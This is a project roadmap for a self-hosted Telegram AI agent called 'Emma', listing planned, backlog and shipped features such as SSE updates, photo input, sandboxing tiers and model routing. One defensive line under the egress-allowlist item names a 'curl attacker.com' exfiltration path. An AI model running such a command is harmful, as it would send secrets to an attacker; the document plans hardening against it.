# andybioticlaw — Roadmap

Living list. Updated whenever a feature is proposed, dropped, or shipped.
Newest ideas go to the bottom of Backlog; items move from Backlog to
"Planned next" when scheduled; items move from "Planned next" to
"Shipped" once they land in main.

Maintenance rule: update this file **in the same commit** that proposes,
drops, or ships the idea. For tiny ideas that come up mid-conversation,
a one-line add to Backlog is enough — don't gate on a full spec.

## Planned next

*(empty — see "Shipped" below for items recently moved from here.)*

## Backlog — high-impact, small scope (quick wins)

- **Live Sessions via SSE** — replace 2s polling with a single SSE
  stream. One open connection, instant updates, less chatter.
  ~ half day.
- **Mobile-friendly dashboard pass** — breakpoint audit, some
  `md:grid-cols-2 grid-cols-1` swaps. ~ half day.
- **Config-page numeric unit heuristics — broader audit** — fixed in
  `844a9b1` for `conversationHistoryLimit → msgs`; other potentially
  wrong units worth auditing as the config grows.

## Backlog — medium scope (a weekend each)

- **Photo input** — Telegram `message.photo[]` → Claude CLI
  `--input-format stream-json` with image blocks. Mirror of `voice.ts`
  pipeline. ~ 1 day.
- **Gmail skill via Google OAuth device flow** — same pattern as
  google-calendar. Probably worth factoring out a shared Google-OAuth
  helper first once we have two Google skills.
- **Backup / restore flow** — `andybioticlaw export` → encrypted
  tarball (SQLite + `.env` + skill secrets). `import` on a fresh VPS.
- **Skill testing harness** — dry-run a skill's `install.sh` + MCP
  server against a fake principal.
- **Message-history summarisation** — compress old messages into a
  summary before feeding them to context. Saves tokens on long chats.
- **Smarter model router** — upgrade the heuristic router to an
  LLM-based classifier once we have enough session data to know where
  the cheap heuristic mis-routes.

## Backlog — large scope (weeks)

- **Security tier 2 — systemd sandbox directives** (`PrivateTmp`,
  `ProtectHome`, `ReadWritePaths`, `NoNewPrivileges`, …) in the
  service unit. Filesystem-level hardening.
- **Security tier 3 — bubblewrap / Docker isolation** per session
  with a per-session writable workspace + read-only FS. Real
  "runMode workspace" implementation.
- **Security tier 4 — separate OS user + secrets proxy**. Emma never
  sees `.env`; a tiny proxy service holds secrets and injects them
  at egress.
- **Network egress allowlist** — iptables/nftables kernel-level
  default-deny with specific API endpoints whitelisted. Closes the
  `curl attacker.com` exfil path that outbound-redaction can't.
- **Multi-user / group chat scope** — real
  `telegram.group.runMode: workspace` support with per-chat isolation.
- **Multiple personas per context** — "work-Emma" vs "personal-Emma"
  system prompts picked by chat origin.

## Backlog — lower priority / not yet compelling

- Prometheus `/metrics` endpoint (only matters once we have Grafana).
- Inline Telegram reactions / polls / quizzes.
- Skill marketplace / install-from-URL (only useful with ≥20 skills).
- Gesture / haptic feedback on the web dashboard (no mobile app yet).

## Shipped

- **Proactive briefings** — morning + evening DMs from Emma at operator-
  configured times. Wraps the existing `agent-task` scheduler kind.
  Toggled from the Settings menu under "Briefings".
  *(see `feat: proactive briefings + model routing + memory hygiene + roadmap`)*
- **Model routing (Opus ↔ Haiku)** — opt-in heuristic router (length +
  keyword + `/opus` / `/haiku` slash prefix) at `src/agent/route.ts`.
  Toggled from Settings → Agent → "Cheap-model router".
  *(see `feat: proactive briefings + model routing + memory hygiene + roadmap`)*
- **Memory hygiene** — migration 0007 adds `last_used_at` + `pinned`
  columns. Dashboard Memory page gains a Last-used column, Stale filter,
  pin button, and a sort dropdown. `MemoryManager.snapshot()` now bumps
  `last_used_at` for the entries it reads into context.
  *(see `feat: proactive briefings + model routing + memory hygiene + roadmap`)*
